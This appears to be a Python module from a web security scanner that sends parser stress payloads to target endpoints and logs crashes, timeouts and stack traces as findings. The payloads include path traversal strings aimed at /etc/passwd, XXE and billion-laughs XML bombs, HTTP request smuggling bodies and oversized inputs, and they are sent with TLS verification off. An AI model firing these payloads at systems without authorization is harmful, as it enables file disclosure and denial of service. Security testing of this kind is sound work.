"""ENGINE 5: Memory / Parser Edge Cases.

Stresses parsers and allocators with boundary inputs:
- Oversized payloads (64KB, 1MB, 10MB)
- Deeply nested structures (50, 100, 500 levels)
- Encoding confusion (null bytes, Unicode overlong, mixed encoding)
- Path traversal variants
- Request smuggling (CL.TE vs TE.CL)
"""
import time
import threading
from urllib.parse import urlparse
from core.logger import log
from core.utils import req_lib, REQUESTS_AVAILABLE
from scanner.state import scan_state, LOCK
from scanner.findings import add_finding

# ── Payload generators ─────────────────────────────────────────────────────────

def _oversized_payloads():
    """Generate oversized payloads at various sizes."""
    return [
        ('64KB_string', 'A' * 65536),
        ('1MB_string', 'B' * 1048576),
        ('64KB_json_key', {('X' * 65536): 'value'}),
        ('64KB_json_value', {'param': 'V' * 65536}),
        ('large_array', {'items': list(range(10000))}),
        ('10000_char_url', 'https://example.com/' + 'a' * 10000),
    ]


def _nested_payloads():
    """Generate deeply nested JSON payloads."""
    payloads = []
    for depth in [50, 100, 500]:
        nested = 'value'
        for _ in range(depth):
            nested = {'level': nested}
        payloads.append((f'json_depth_{depth}', nested))
    return payloads


def _encoding_payloads():
    """Generate encoding confusion payloads."""
    return [
        ('null_byte_path', '/admin%00.html'),
        ('null_byte_param', {'file': 'test%00.php'}),
        ('overlong_utf8', {'input': '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'}),
        ('utf16_bom', {'data': '\xff\xfe\x00\x00<root></root>'}),
        ('mixed_encoding', {'path': '..%2f..%2f..%2fetc/passwd'}),
        ('double_encoded', {'path': '..%252f..%252f..%252fetc%252fpasswd'}),
        ('unicode_dot', {'path': '\uff0e\uff0e/etc/passwd'}),
        ('backslash_traversal', {'path': '..\\..\\..\\windows\\system32'}),
    ]


def _path_traversal_payloads():
    """Generate path traversal variants."""
    return [
        ('unix_basic', '../../../../etc/passwd'),
        ('unix_double', '....//....//....//etc/passwd'),
        ('unix_null', '..%00/..%00/..%00/etc/passwd'),
        ('unix_overlong', '..%c0%af..%c0%af..%c0%afetc/passwd'),
        ('windows_basic', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'),
        ('windows_double', '....\\\\....\\\\....\\\\windows'),
        ('unix_absolute', '/etc/passwd'),
        ('dot_slash', './././etc/passwd'),
    ]


def _request_smuggling_payloads():
    """Generate request smuggling test payloads."""
    return [
        ('cl_te', {
            'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '6'},
            'body': '0\r\n\r\nX',
        }),
        ('te_cl', {
            'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '3'},
            'body': '8\r\nSMUGGLED\r\n0\r\n\r\n',
        }),
        ('te_te', {
            'headers': {'Transfer-Encoding': 'chunked, chunked'},
            'body': '0\r\n\r\n',
        }),
        ('duplicate_cl', {
            'headers': {'Content-Length': '0', 'Content-Length': '6'},
            'body': 'XSSME',
        }),
    ]


def _xml_stress_payloads():
    """Generate XML parser stress payloads."""
    return [
        ('billion_laughs', '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>'),
        ('quadratic_bomb', '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><data>&b;</data>'),
        ('entity_expansion', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null"><!ENTITY clone SYSTEM "file:///dev/urandom">]><root>&clone;</root>'),
        ('deep_nesting_xml', '<root>' + '<child>' * 1000 + 'payload' + '</child>' * 1000 + '</root>'),
    ]


# ── Engine core ────────────────────────────────────────────────────────────────

class ParserStressEngine:
    """Memory / parser edge case engine.

    Stresses parsers and allocators with boundary inputs. Monitors for crashes,
    stack traces, timeouts, and memory exhaustion.
    """

    def __init__(self, target, max_requests=200):
        self.target = target
        self.max_requests = max_requests
        self.findings = []
        self.request_count = 0
        self.crashes = []
        self.timeouts = []
        self._lock = threading.Lock()

    def _send_stress_payload(self, url, param, payload, payload_type, method='GET'):
        """Send a stress payload and monitor for crashes/timeouts."""
        if not REQUESTS_AVAILABLE or not req_lib:
            return

        if self.request_count >= self.max_requests:
            return

        try:
            start = time.time()

            # Determine how to send based on payload type
            if isinstance(payload, dict) and '_xml_body' in payload:
                resp = req_lib.post(url, data=payload['_xml_body'],
                                   headers={'Content-Type': 'application/xml'},
                                   timeout=15, verify=False)
            elif isinstance(payload, dict):
                if method == 'GET':
                    resp = req_lib.get(url, params=payload, timeout=15, verify=False)
                else:
                    resp = req_lib.post(url, json=payload, timeout=15, verify=False)
            else:
                if method == 'GET':
                    resp = req_lib.get(url, params={param: str(payload)}, timeout=15, verify=False)
                else:
                    resp = req_lib.post(url, json={param: str(payload)}, timeout=15, verify=False)

            elapsed = time.time() - start

            with self._lock:
                self.request_count += 1

            body = resp.text[:5000] if resp.text else ''
            body_lower = body.lower()

            # Detect crashes
            crash_indicators = [
                'traceback', 'exception', 'fatal error', 'segfault',
                'out of memory', 'heap overflow', 'stack overflow',
                'internal server error', '502 bad gateway', '503 service',
                'connection reset', 'broken pipe',
            ]

            for indicator in crash_indicators:
                if indicator in body_lower:
                    crash_info = {
                        'type': payload_type,
                        'url': url,
                        'param': param,
                        'payload_preview': str(payload)[:200],
                        'status': resp.status_code,
                        'indicator': indicator,
                        'response_preview': body[:500],
                    }
                    with self._lock:
                        self.crashes.append(crash_info)

                    sev = 'critical' if indicator in ('segfault', 'heap overflow', 'stack overflow') else 'high'
                    try:
                        add_finding(
                            sev=sev,
                            title=f'Parser crash: {indicator} on {param or "endpoint"}',
                            sub=f'Parser stress engine — {payload_type}',
                            asset=url,
                            details=f'Indicator: {indicator}\n'
                                    f'Payload type: {payload_type}\n'
                                    f'Payload preview: {str(payload)[:200]}\n'
                                    f'Status: {resp.status_code}\n'
                                    f'Response: {body[:500]}',
                            confidence='confirmed',
                        )
                    except Exception:
                        pass

                    log('ok', f'[PARSER-STRESS] CRASH detected: {indicator} at {url}')
                    return

            # Detect timeout (slow response = potential DoS)
            if elapsed > 10:
                timeout_info = {
                    'type': payload_type,
                    'url': url,
                    'param': param,
                    'elapsed': elapsed,
                    'payload_preview': str(payload)[:200],
                }
                with self._lock:
                    self.timeouts.append(timeout_info)

                try:
                    add_finding(
                        sev='medium',
                        title=f'DoS potential: {elapsed:.1f}s response on {param or "endpoint"}',
                        sub=f'Parser stress engine — timeout',
                        asset=url,
                        details=f'Response time: {elapsed:.1f}s\n'
                                f'Payload type: {payload_type}\n'
                                f'Payload preview: {str(payload)[:200]}',
                        confidence='medium',
                    )
                except Exception:
                    pass

            # Detect stack traces / error messages
            error_indicators = ['traceback', 'at line', 'file "', 'syntaxerror',
                               'typeerror', 'valueerror', 'nameerror', 'indexerror']
            if any(ind in body_lower for ind in error_indicators):
                if resp.status_code >= 500:
                    try:
                        add_finding(
                            sev='high',
                            title=f'Information disclosure: stack trace on {param or "endpoint"}',
                            sub=f'Parser stress engine — error disclosure',
                            asset=url,
                            details=f'Status: {resp.status_code}\n'
                                    f'Payload type: {payload_type}\n'
                                    f'Response: {body[:1000]}',
                            confidence='confirmed',
                        )
                    except Exception:
                        pass

        except Exception as e:
            error_str = str(e).lower()
            if 'timeout' in error_str or 'timed out' in error_str:
                with self._lock:
                    self.timeouts.append({
                        'type': payload_type,
                        'url': url,
                        'param': param,
                        'error': str(e)[:200],
                    })
            elif 'connection reset' in error_str or 'broken pipe' in error_str:
                with self._lock:
                    self.crashes.append({
                        'type': payload_type,
                        'url': url,
                        'param': param,
                        'indicator': 'connection_reset',
                        'error': str(e)[:200],
                    })

    def run(self, endpoints):
        """Run parser stress testing against discovered endpoints.

        Args:
            endpoints: list of (url, params_dict, content_type) tuples

        Returns:
            dict with crashes, timeouts, findings, request count
        """
        if not REQUESTS_AVAILABLE:
            log('warn', '[PARSER-STRESS] requests library not available — skipping')
            return {'crashes': [], 'timeouts': [], 'findings': [], 'requests': 0}

        log('info', f'[PARSER-STRESS] Starting parser stress testing against {len(endpoints)} endpoints')

        # Generate all payloads
        all_payloads = []
        all_payloads.extend([('oversized', p) for p in _oversized_payloads()])
        all_payloads.extend([('nested', p) for p in _nested_payloads()])
        all_payloads.extend([('encoding', p) for p in _encoding_payloads()])
        all_payloads.extend([('path_traversal', p) for p in _path_traversal_payloads()])
        all_payloads.extend([('xml_stress', p) for p in _xml_stress_payloads()])

        for url, params, content_type in endpoints:
            if self.request_count >= self.max_requests:
                break

            for param_name in (params or {}):
                if self.request_count >= self.max_requests:
                    break

                for payload_type, payload in all_payloads:
                    if self.request_count >= self.max_requests:
                        break

                    self._send_stress_payload(url, param_name, payload, payload_type)
                    time.sleep(0.05)  # gentle pacing

        # Also test request smuggling (separate from param-based tests)
        log('info', '[PARSER-STRESS] Testing request smuggling variants')
        for url, _, _ in endpoints[:5]:  # limit to first 5 endpoints
            if self.request_count >= self.max_requests:
                break
            parsed = urlparse(url)
            base_url = f'{parsed.scheme}://{parsed.netloc}'

            for smuggle_type, smuggle_data in _request_smuggling_payloads():
                if self.request_count >= self.max_requests:
                    break
                try:
                    # Send raw request with smuggling headers
                    headers = smuggle_data.get('headers', {})
                    body = smuggle_data.get('body', '')
                    resp = req_lib.post(base_url, data=body, headers=headers,
                                       timeout=10, verify=False)
                    with self._lock:
                        self.request_count += 1

                    # Check if smuggling worked (different response than expected)
                    if resp.status_code in (200, 301, 302):
                        # Likely vulnerable — server forwarded the smuggled request
                        try:
                            add_finding(
                                sev='critical',
                                title=f'HTTP request smuggling: {smuggle_type}',
                                sub=f'Parser stress engine — smuggling',
                                asset=base_url,
                                details=f'Smuggling type: {smuggle_type}\n'
                                        f'Headers: {headers}\n'
                                        f'Body preview: {body[:200]}\n'
                                        f'Response status: {resp.status_code}',
                                confidence='medium',
                            )
                        except Exception:
                            pass
                except Exception:
                    pass

        log('ok', f'[PARSER-STRESS] Complete: {len(self.crashes)} crashes, '
                  f'{len(self.timeouts)} timeouts, {self.request_count} requests')

        return {
            'crashes': self.crashes,
            'timeouts': self.timeouts,
            'findings': self.findings,
            'requests': self.request_count,
        }
